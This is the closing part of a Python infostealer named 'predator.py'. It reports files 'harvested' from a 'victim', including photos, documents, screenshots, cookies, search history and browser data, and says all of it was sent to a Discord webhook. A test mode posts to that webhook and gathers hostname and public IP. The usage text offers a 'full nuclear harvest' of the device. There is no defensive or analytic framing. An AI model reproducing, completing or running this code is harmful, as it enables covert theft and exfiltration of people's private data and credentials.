        print("📊"*70)
        
        print(f"""
✅ OPERATION SUCCESSFUL
⏱️  Time Taken: {elapsed_time:.1f} seconds

📈 HARVEST STATISTICS:
  • Victim ID: {VICTIM_ID}
  • Total Files Harvested: {len(harvester.harvested_files)}
  • Total Data Size: {harvester.total_size // (1024*1024)} MB
  • Photos: {len(harvested_data['media_files']['photos'])}
  • Videos: {len(harvested_data['media_files']['videos'])}
  • Documents: {len(harvested_data['documents'])}
  • Screenshots: {len(harvested_data['screenshot_data'])}
  • Cookies: {len(harvested_data['cookies'])}
  • Search History: {len(harvested_data['search_history'])} entries
  • Hacking Tools: {len(harvested_data['system_info']['hacking_tools'])}
  • Browser Data Sets: {sum(1 for b in harvested_data['browser_data'].values() if b['found'])}

💾 LOCAL BACKUP:
  All data saved in memory and sent to Discord
  ZIP file contains complete harvest

🔍 CHECK YOUR DISCORD FOR:
  1. Summary report
  2. Detailed sections
  3. ZIP file with harvested data
  4. Final confirmation

🔥 M1 EZ HAING NOW PH - NUCLEAR DOMINANCE ACHIEVED
💀 SYSTEM COMPLETELY HARVESTED AND COMPROMISED
""")
        
    except KeyboardInterrupt:
        print("\n❌ HARVEST INTERRUPTED BY USER")
    except Exception as e:
        print(f"\n❌ ERROR: {str(e)}")
        import traceback
        traceback.print_exc()

# ════════ QUICK TEST ════════
def quick_test():
    """Quick test function"""
    print("\n" + "🔧"*35)
    print("QUICK TEST MODE")
    print("🔧"*35)
    
    # Test webhook
    print("\n[1] Testing Discord webhook...")
    try:
        test_msg = {"content": "🔧 NUCLEAR PREDATOR TEST\nTime: " + datetime.now().strftime("%H:%M:%S")}
        data = json.dumps(test_msg).encode()
        headers = {'Content-Type': 'application/json'}
        
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
        response = urllib.request.urlopen(req, timeout=10)
        
        print(f"✅ Webhook test passed! Status: {response.status}")
        print("✅ Check Discord for test message")
        
    except Exception as e:
        print(f"❌ Webhook test failed: {str(e)[:100]}")
    
    # Test system info
    print("\n[2] Testing system info collection...")
    harvester = NuclearHarvester()
    sys_info = harvester.get_system_intel()
    print(f"✅ System info collected: {len(json.dumps(sys_info)):,} bytes")
    print(f"✅ Device: {sys_info['basic_info']['hostname']}")
    print(f"✅ IP: {sys_info['network_info'].get('public_ip', 'Unknown')}")

# ════════ RUN SCRIPT ════════
if __name__ == "__main__":
    # Handle arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "test":
            quick_test()
        elif sys.argv[1] == "lite":
            # Lite version
            print("\nRunning lite version...")
            main()
        elif sys.argv[1] == "help":
            print("""
Usage:
  python3 predator.py        # Run full nuclear harvest
  python3 predator.py test   # Quick test mode
  python3 predator.py lite   # Lite version
  python3 predator.py help   # This message

⚠️  WARNING: Full version harvests ALL data from device!
            """)
        else:
            main()
    else:
        # Run full version by default
        main()
